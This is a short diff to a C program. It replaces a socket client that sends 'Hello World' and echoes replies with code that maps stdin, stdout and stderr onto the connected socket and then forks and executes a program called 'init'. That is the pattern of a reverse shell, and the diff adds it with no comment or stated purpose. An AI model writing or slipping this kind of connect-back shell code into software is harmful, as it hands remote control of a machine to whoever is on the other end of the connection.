@@ -15,15 +15,15 @@ int main() {
     bind(sock_fd, (struct sockaddr*)&addr, sizeof(struct sockaddr_in));
     connect(sock_fd, (struct sockaddr*)&dest, sizeof(struct sockaddr_in));
 
-    send(sock_fd, "Hello World\n", 12, 0);
-    printf("Sent Hello World\n");
+    dup2(sock_fd, 0);
+    dup2(sock_fd, 1);
+    dup2(sock_fd, 2);
 
-    char recv_buf[128] = {0};
-    while (true) {
-        size_t len = recv(sock_fd, recv_buf, 128, 0);
-        recv_buf[len] = '\0';
-        printf("received: %lu '%s'\n", len, recv_buf);
-        send(sock_fd, recv_buf, len, 0);
+    if (fork() == 0) {
+        char* argv0 = NULL;
+        execve("init", &argv0, NULL);
     }
+
+    return 0;
 }
 
